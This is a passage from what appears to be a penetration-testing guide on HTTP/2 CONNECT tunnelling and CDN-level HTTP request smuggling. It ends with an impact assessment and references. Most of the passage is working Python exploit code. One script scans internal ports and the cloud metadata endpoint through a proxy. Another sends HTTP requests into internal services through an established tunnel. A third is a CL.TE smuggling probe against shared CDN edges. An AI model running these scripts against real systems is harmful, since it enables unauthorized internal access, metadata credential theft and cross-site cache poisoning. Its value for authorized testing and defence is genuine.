    ("127.0.0.1", 80),
    ("127.0.0.1", 8080),
    ("127.0.0.1", 8443),
    ("127.0.0.1", 3000),
    ("127.0.0.1", 6379),    # Redis
    ("127.0.0.1", 9200),    # Elasticsearch
    ("127.0.0.1", 5432),    # PostgreSQL
    ("127.0.0.1", 3306),    # MySQL
    ("10.0.0.1", 80),
    ("169.254.169.254", 80), # Cloud metadata
    ("metadata.google.internal", 80),
]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])

for target_host, target_port in internal_targets:
    try:
        sock = socket.create_connection((proxy_host, proxy_port), timeout=5)
        ssock = ctx.wrap_socket(sock, server_hostname=proxy_host)

        config = h2.config.H2Configuration(client_side=True)
        conn = h2.connection.H2Connection(config=config)
        conn.initiate_connection()
        ssock.send(conn.data_to_send())

        # Send CONNECT request targeting internal service
        headers = [
            (":method", "CONNECT"),
            (":authority", f"{target_host}:{target_port}"),
        ]

        conn.send_headers(1, headers, end_stream=False)
        ssock.send(conn.data_to_send())

        resp = ssock.recv(65535)
        events = conn.receive_data(resp)

        for event in events:
            if isinstance(event, h2.events.ResponseReceived):
                status = dict(event.headers).get(b":status", b"?").decode()
                if status == "200":
                    print(f"[OPEN] {target_host}:{target_port} — tunnel established")
                elif status in ("403", "405"):
                    print(f"[BLOCKED] {target_host}:{target_port} — {status}")
                else:
                    print(f"[{status}] {target_host}:{target_port}")
            elif isinstance(event, h2.events.StreamReset):
                print(f"[RESET] {target_host}:{target_port} — stream reset (error: {event.error_code})")

        ssock.close()
    except Exception as e:
        print(f"[ERROR] {target_host}:{target_port} — {e}")

PYEOF
```

### Reaching Internal Services Through CONNECT Tunnels

```bash
# Once a CONNECT tunnel is established, send raw HTTP through it
# to interact with internal services

python3 << 'PYEOF'
import h2.connection
import h2.config
import h2.events
import socket
import ssl

proxy_host = "TARGET"
proxy_port = 443
internal_host = "127.0.0.1"
internal_port = 8080

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])

sock = socket.create_connection((proxy_host, proxy_port), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname=proxy_host)

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
ssock.send(conn.data_to_send())

# Establish tunnel
headers = [
    (":method", "CONNECT"),
    (":authority", f"{internal_host}:{internal_port}"),
]
conn.send_headers(1, headers, end_stream=False)
ssock.send(conn.data_to_send())

resp = ssock.recv(65535)
events = conn.receive_data(resp)
tunnel_ok = False
for event in events:
    if isinstance(event, h2.events.ResponseReceived):
        status = dict(event.headers).get(b":status", b"?").decode()
        if status == "200":
            tunnel_ok = True
            print(f"[*] Tunnel established to {internal_host}:{internal_port}")

if tunnel_ok:
    # Send HTTP request through the tunnel as DATA frames
    inner_request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {internal_host}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    conn.send_data(1, inner_request.encode(), end_stream=False)
    ssock.send(conn.data_to_send())

    # Read the internal service response
    resp = ssock.recv(65535)
    events = conn.receive_data(resp)
    for event in events:
        if isinstance(event, h2.events.DataReceived):
            print("[*] Internal service response:")
            print(event.data.decode(errors="replace")[:2000])

ssock.close()
PYEOF
```

### James Kettle 2025 Research: CDN-Level HTTP Desync

In 2025, James Kettle published new research demonstrating HTTP desync
techniques that affect major CDN providers, with an estimated impact on
approximately 30 million websites. The key findings:

**CDN-level desync** — Unlike traditional smuggling where the attacker
targets one back-end behind one proxy, CDN-level desync compromises the
CDN infrastructure itself. Because a single CDN serves thousands of
customers, a desync at the CDN layer can be weaponized to:

1. **Poison responses for any domain** behind the affected CDN, not just
   the attacker's target.
2. **Hijack requests** from users of unrelated websites that happen to
   share the same CDN edge node.
3. **Bypass WAF and security controls** for all customers simultaneously,
   since the smuggled request is processed after the CDN's security layer.

**New HTTP/2 desync vectors** — The research identified novel ways that
HTTP/2-to-HTTP/1.1 downgrade creates smuggling opportunities at the CDN
edge, including:

- Request collapsing: CDNs that merge multiple client requests into a
  single backend connection can be tricked into misattributing responses.
- Header injection via pseudo-header manipulation in HTTP/2 frames that
  survives downgrade translation.
- Tunnel-based smuggling through HTTP/2 CONNECT where the CDN acts as a
  transparent proxy without adequate request boundary enforcement.

```bash
# Testing for CDN-level desync indicators

# Step 1: Identify shared CDN infrastructure
# Multiple unrelated domains resolving to the same CDN edge
dig +short target1.com target2.com target3.com
# If they share IP ranges, they may share CDN edge nodes

# Step 2: Test if responses from different origins leak across connections
# Send rapid sequential requests to different Host headers on the same
# CDN IP, watching for response/host mismatches

python3 << 'PYEOF'
import socket
import ssl
import time

cdn_ip = "CDN_EDGE_IP"
port = 443
domains = ["target1.com", "target2.com"]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

for domain in domains:
    sock = socket.create_connection((cdn_ip, port), timeout=10)
    ssock = ctx.wrap_socket(sock, server_hostname=domain)

    # Smuggling probe: CL.TE through the CDN
    body = "0\r\n\r\nGET / HTTP/1.1\r\nHost: OTHER_DOMAIN\r\n\r\n"
    payload = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {domain}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{body}"
    )

    ssock.send(payload.encode())
    time.sleep(0.5)
    resp = ssock.recv(8192).decode(errors="replace")
    print(f"[{domain}] Response preview:")
    print(resp[:500])
    print("---")
    ssock.close()

PYEOF

# Step 3: If response contains content from a different domain,
# CDN-level desync is confirmed -- this is CRITICAL severity
```

### Impact Assessment

```
CDN-level desync:
  Severity  : CRITICAL (P1)
  Scale     : Potentially all customers behind the affected CDN
  Impact    : Mass cache poisoning, credential theft across domains,
              WAF bypass for all tenants, session hijacking
  Disclosure: Report to CDN vendor, NOT individual site owners

HTTP/2 CONNECT internal access:
  Severity  : HIGH to CRITICAL depending on what is reachable
  Impact    : Internal port scanning, access to metadata services,
              interaction with databases and internal APIs
  Note      : Cloud metadata access (169.254.169.254) escalates to CRITICAL
```

---

## References

- James Kettle, "HTTP Desync Attacks" (PortSwigger Research, 2019)
- James Kettle, "HTTP/2: The Sequel is Always Worse" (PortSwigger Research, 2021)
- James Kettle, HTTP desync research on CDN-level attacks (PortSwigger Research, 2025)
- Amit Klein, "HTTP Request Smuggling" (original research, 2005)
- PortSwigger Web Security Academy — HTTP Request Smuggling labs
- PortSwigger Top 10 Web Hacking Techniques of 2025, #9 — HTTP/2 CONNECT
- https://github.com/defparam/smuggler
- https://github.com/BishopFox/h2cSmuggler
- RFC 7230 Section 3.3.3 — Message Body Length
- RFC 7540 Section 8.3 — The CONNECT Method (HTTP/2)
